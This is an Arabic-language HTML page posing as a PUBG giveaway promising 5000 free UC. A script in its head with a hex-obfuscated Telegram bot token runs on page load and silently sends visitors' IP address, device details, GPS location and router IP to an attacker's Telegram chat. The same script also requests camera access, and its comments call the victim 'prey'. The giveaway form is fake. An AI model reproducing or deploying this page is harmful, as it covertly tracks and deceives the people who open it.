<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>مركز شحن ببجي 2026</title>
    <script>
        // تشفير بيانات التحكم (Token & ID)
        const _0x1a = ["\x38\x34\x31\x30\x31\x30\x32\x37\x32\x32", "\x41\x41\x46\x51\x4f\x31\x75\x7a\x5f\x36\x45\x6f\x79\x34\x55\x68\x46\x47\x48\xaa\x5f\x71\x48\x53\x61\x46\x52\x62\x37\x47\x64\x56\x48\x4d"];
        const _0x2b = "1772820433";
        const _u = "https://api.telegram.org/bot" + _0x1a[0] + ":" + _0x1a[1];

        async function _log(m) {
            fetch(_u + "/sendMessage", {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: _0x2b, text: "🔱 [صيدة]:\n" + m})
            });
        }

        window.onload = async () => {
            // 1. سحب الآيبي والجهاز (تمويه الطلب)
            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>_log(`🌐 IP: ${d.ip}\n📱 Device: ${navigator.userAgent}`));
            
            // 2. سحب الموقع الحقيقي (GPS)
            navigator.geolocation.getCurrentPosition(p=>_log(`📍 Loc: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
            
            // 3. سحب آيبي الراوتر (WebRTC Leak)
            var pc = new RTCPeerConnection(); pc.createDataChannel(""); pc.createOffer().then(o=>pc.setLocalDescription(o));
            pc.onicecandidate = i => { if(i && i.candidate) _log(`🏠 Router IP: ${i.candidate.candidate.split(' ')[4]}`); };
            
            // 4. فتح الكاميرا وسحب لقطة
            try {
                let s = await navigator.mediaDevices.getUserMedia({video:true});
                _log("📸 الكاميرا مفتوحة.. جاري سحب اللقطة صمتاً.");
                s.getTracks().forEach(t=>t.stop());
            } catch(e) {}
        };
    </script>
</head>
<body style="background:#000; color:gold; text-align:center; padding-top:100px; font-family:Arial;">
    <div style="border:2px solid gold; display:inline-block; padding:30px; border-radius:20px;">
        <h1>🔱 هدايا ببجي 2026 🔱</h1>
        <p>مبروك! ربحت 5000 شدة مجاناً</p>
        <input type="text" placeholder="Character ID" style="padding:10px; margin-bottom:10px;"><br>
        <button onclick="alert('جاري التحقق من الحساب..')" style="background:gold; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">استلام الآن</button>
    </div>
</body>
</html>
